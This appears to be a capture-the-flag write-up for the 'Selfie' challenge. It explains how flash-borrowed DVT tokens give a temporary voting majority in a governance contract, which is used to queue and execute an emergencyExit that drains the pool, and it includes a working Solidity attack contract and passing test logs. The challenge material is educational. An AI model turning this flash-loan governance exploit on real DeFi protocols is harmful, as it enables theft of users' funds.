# Challenge - Selfie

A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

## Objective of CTF

Rescue all funds from the pool and deposit them into the designated recovery account.

## Vulnerability Analysis

The `SelfiePool` contract, which acts as the lending pool, provides flash loans of DVT tokens and includes an emergency function to withdraw all DVT tokens to a specified receiver address:

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}
```

However, only the governance contract, the `SimpleGovernance` contract, can execute this function. To trigger it, an action must first be queued using the `queueAction()` function in the `SimpleGovernance` contract:

```solidity
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    if (target == address(this)) {
        revert InvalidTarget();
    }

    if (data.length > 0 && target.code.length == 0) {
        revert TargetMustHaveCode();
    }

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    emit ActionQueued(actionId, msg.sender);
}
```

Importantly, not just anyone can queue an action; the caller needs to hold at least half of the total supply of DVT tokens, as shown below:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

After a delay of two days, the queued action can be executed by calling `executeAction()` in the SimpleGovernance contract:

```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}
```

Do you see the vulnerability? To queue an action, you need to control half of the total supply of DVT tokens. However, the pool offers flash loans of DVT tokens, which can be exploited to temporarily meet this requirement.

### Attack steps:

1. Initiate a flash loan to borrow the maximum amount of DVT tokens and use them to queue an action that executes the `emergencyExit()` function during the loan.
2. Wait 2 days (using `vm.warp(block.timestamp + 2 days)` in test), then execute the queued action by calling the `executeAction()` function.
3. Transfer the rescued token to the `recovery` address.

## PoC test case

### Attack contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Ownable} from "solady/auth/Ownable.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

interface ISelfiePool {
    function maxFlashLoan(address _token) external view returns (uint256);
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        returns (bool);
}

contract AttackSelfiePool is IERC3156FlashBorrower, Ownable {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableVotes private immutable token;
    address private immutable governance;
    address private immutable pool;
    address private immutable recovery;

    constructor(address _token, address _governance, address _pool, address _recovery) {
        _initializeOwner(msg.sender);

        token = DamnValuableVotes(_token);
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external onlyOwner {
        uint256 amount = ISelfiePool(pool).maxFlashLoan(address(token));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        ISelfiePool(pool).flashLoan(this, address(token), amount, data);
    }

    function onFlashLoan(address _sender, address, uint256 _amount, uint256, bytes calldata data)
        external
        returns (bytes32)
    {
        require(_sender == address(this), "invalid sender");
        require(msg.sender == pool, "not from pool");

        token.delegate(address(this));
        ISimpleGovernance(governance).queueAction(pool, 0, data);
        token.approve(pool, type(uint256).max);

        return CALLBACK_SUCCESS;
    }
}
```

### Test Result

```
Ran 2 tests for test/selfie/Selfie.t.sol:SelfieChallenge
[PASS] test_assertInitialState() (gas: 23817)
[PASS] test_selfie() (gas: 875599)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the pool contract: 1500000.000000000000000000
  token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the pool contract: 0.000000000000000000
  token balance in the recovery address: 1500000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.91ms (871.38µs CPU time)

Ran 1 test suite in 257.84ms (7.91ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
